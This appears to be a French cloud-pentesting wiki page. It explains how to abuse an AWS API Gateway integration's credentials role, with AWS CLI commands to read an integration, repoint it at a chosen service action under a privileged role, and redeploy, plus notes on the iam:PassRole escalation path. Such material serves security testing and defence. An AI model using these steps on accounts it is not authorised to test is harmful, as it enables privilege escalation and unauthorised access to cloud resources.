---
title: "Rôle d'intégration : agir sous le rôle de crédentiels derrière la gateway"
order: 3
description: "Abuser du rôle de crédentiels d'intégration d'API Gateway sous lequel s'exécutent les appels backend proxifiés."
keywords:
  - integration role
  - API Gateway
  - AWS integration
  - backend
  - role
---

# Rôle d'intégration

Une intégration de service AWS permet à API Gateway d'appeler directement un service AWS backend, et elle le fait avec un **rôle de crédentiels d'intégration** (`credentials` sur l'intégration). Quiconque peut invoquer la route atteint ce service en tant que rôle, et quiconque peut définir ou modifier une intégration peut la pointer vers n'importe quel service et y attacher n'importe quel rôle transmissible, transformant la gateway en un proxy qui agit avec les permissions du rôle.

## Lire l'intégration

```bash
aws apigateway get-integration --rest-api-id <id> --resource-id <rid> \
  --http-method <m> --query '[type,credentials,uri]'
```

Une valeur `credentials` qui est un ARN de rôle (et non `arn:aws:iam::*:user/*`) correspond au rôle d'intégration ; `uri` indique quelle action de service la route proxifie.

## Repointer une intégration que vous pouvez modifier

```bash
aws apigateway put-integration --rest-api-id <id> --resource-id <rid> \
  --http-method <m> --type AWS --integration-http-method POST \
  --uri 'arn:aws:apigateway:<region>:<service>:action/<Action>' \
  --credentials arn:aws:iam::<acct>:role/<privileged-role>
aws apigateway create-deployment --rest-api-id <id> --stage-name <stage>
```

## Notes d'exploitation

- Définir une intégration avec `--credentials` exige `iam:PassRole` sur ce rôle, ce qui en fait aussi un chemin d'escalade PassRole limité à API Gateway.
- Une route qui proxifie déjà un service sensible (par exemple `states:StartExecution` ou `s3:GetObject`) est exploitable par simple invocation, sans aucune modification.
- Redéployez le stage après avoir modifié une intégration, faute de quoi le changement ne prend pas effet.

## Outils

- **AWS CLI** (`apigateway get-integration`, `put-integration`, `create-deployment`) : lire et repointer.

## Références

- [AWS : intégrations de services AWS d'API Gateway](https://docs.aws.amazon.com/apigateway/latest/developerguide/integrating-api-with-aws-services-s3.html)
- [HackTricks Cloud : AWS API Gateway](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/index.html)
- [Hacking the Cloud : AWS](https://hackingthe.cloud/)
- [Conférences fwd:cloudsec](https://fwdcloudsec.org/)
- [CloudFox (Bishop Fox)](https://github.com/BishopFox/cloudfox)
